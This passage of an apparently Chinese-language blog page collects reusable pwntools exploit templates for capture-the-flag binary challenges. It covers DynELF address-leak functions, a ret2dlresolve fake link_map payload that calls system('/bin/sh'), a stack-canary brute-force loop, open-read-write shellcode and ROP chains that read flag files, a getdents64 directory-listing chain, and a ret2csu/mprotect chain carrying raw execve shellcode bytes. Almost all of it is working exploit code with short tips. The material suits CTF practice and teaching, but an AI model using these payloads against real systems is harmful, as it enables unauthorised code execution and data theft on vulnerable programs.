<span class="number">0</span> </span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    up = <span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>) </span><br><span class="line">        count += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>: </span><br><span class="line">            data = data[:-<span class="number">1</span>] </span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            data += c </span><br><span class="line">        up = c </span><br><span class="line">    data = data[:<span class="number">8</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt) + p32(ret_address) + p32(address)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p>
<p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p>
<h2 id="DynELF-基于write的模板"><a href="#DynELF-基于write的模板" class="headerlink" title="DynELF-基于write的模板"></a>DynELF-基于write的模板</h2><p>write比puts友好太多了，这个leak函数也比较简单：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_ret) + p64(addr)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(<span class="number">8</span>)</span><br><span class="line">    payload += p64(write_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p32(write_plt) + p32(ret_address) </span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">4</span>) </span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>配合上面的万能pop，还可以形成更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, addr, <span class="number">1</span>, main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#当然，配合puts也是可以的（puts和write就只有接收部分不同）</span></span><br></pre></td></tr></table></figure>
<p>注意：有些程序自带循环，可以根据具体情况进行修改</p>
<h2 id="ret2dlresolve-64位"><a href="#ret2dlresolve-64位" class="headerlink" title="ret2dlresolve-64位"></a>ret2dlresolve-64位</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_linkmap_addr：可以控制的地址</span></span><br><span class="line"><span class="comment">#known_func_ptr：function_got（已知函数的GOT表地址）</span></span><br><span class="line"><span class="comment">#offset：system_got - function_got</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;function&#x27;</span>]  </span><br><span class="line">plt_load = addr(plt[<span class="number">1</span>]) <span class="comment"># dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, function_got ,l_addr)</span><br><span class="line">payload = flat( padding, pop_rdi, <span class="number">0</span>, pop_rsi, bss_stage, <span class="number">0</span>, read_plt, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, bss_stage + <span class="number">0x48</span>, plt_load, bss_stage, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># “bss_stage+0x48”为&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.send(fake_link_map) </span><br></pre></td></tr></table></figure>
<p>程序先利用read在“bss_stage”中写入了“fake_link_map”</p>
<p>在手动调用dl_runtime_resolve（plt_load），把“bss_stage”和“0”作为参数</p>
<p>执行完成之后，目标函数就会被重定位为“ system(“/bin/sh”) ”</p>
<p>理论上来讲，只要已知了libc版本就可以用这个来打</p>
<h2 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a:	<span class="comment">#一次性不覆盖全部的canary，而是覆盖1字节</span></span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">canary=<span class="string">&#x27;\x00&#x27;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br></pre></td></tr></table></figure>
<p>这两个’xxxx’写什么是关键，要对比“canary通过”和“canary不通过”程序输出的字符串来填入</p>
<h2 id="ORW（ROP链-shellcode）"><a href="#ORW（ROP链-shellcode）" class="headerlink" title="ORW（ROP链+shellcode）"></a>ORW（ROP链+shellcode）</h2><p><strong>ORW原理：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;gmp.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	void* bss;</span><br><span class="line">	<span class="built_in">int</span>* fd,mm;</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	mm=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	bss=malloc(<span class="number">0x90</span>);</span><br><span class="line">	read(<span class="number">3</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	write(<span class="number">1</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	printf(<span class="string">&quot;fd &gt;&gt;%d\n&quot;</span>,fd);</span><br><span class="line">	printf(<span class="string">&quot;mm &gt;&gt;%d\n&quot;</span>,mm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的“read(3,bss,0x30)”（如果前面已经调用了“open”，可以换成“read(4,bss,0x30)”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ywhkkx&#125;</span><br><span class="line">fd &gt;&gt;<span class="number">3</span></span><br><span class="line">mm &gt;&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-32</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p>​        // 不管是64位还是32位：“esp”为“./flag”所在地址，根据具体情况进行填写</p>
<p><strong>ROP链-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">flag=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<p>当不知道程序名称时，用“getdents64”进行操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># open(&quot;.&quot;)[3]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># getdents64(3, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">217</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;.\x00&#x27;</span>) <span class="comment"># read(0, bss_addr, 2) &gt;&gt; open(&quot;.&quot;)</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) <span class="comment"># read(0, bss_addr, 0x30) &gt;&gt; open(&#x27;xxxx&#x27;+flag_s,0)</span></span><br><span class="line">flag_s=p.recv(<span class="number">20</span>)</span><br><span class="line">flag=<span class="string">&#x27;xxxx&#x27;</span>+flag_s</span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>先用“open(“.”)”打开当前目录</li>
<li>使用“getdents64(3, bss_addr + 0x200, 0x600)”打印目录到“bss_addr + 0x200”</li>
<li>使用“write(1, bss_addr + 0x200, 0x600)”打印目录</li>
<li>选择性接受文件名称（至于怎么接收，就要看程序了）</li>
</ul>
<h2 id="Shellcode模板"><a href="#Shellcode模板" class="headerlink" title="Shellcode模板"></a>Shellcode模板</h2><p><strong>ret2csu</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. read shellcode to bss_addr</span></span><br><span class="line">shellcode=<span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.amd64.linux.sh(),arch=&#x27;amd64&#x27;) </span></span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. read bss_addr to got[0]</span></span><br><span class="line">shellcode_got= got[<span class="number">0</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(shellcode_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. read mprotect_libc to got[1]</span></span><br><span class="line">mprot_got= got[<span class="number">1</span>]</span><br><span class="line">payload= padding + fake_ebp</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(mprot_got)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x200</span>)</span><br><span class="line">payload+=p64(read_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(p64(mprotect_libc))</span><br><span 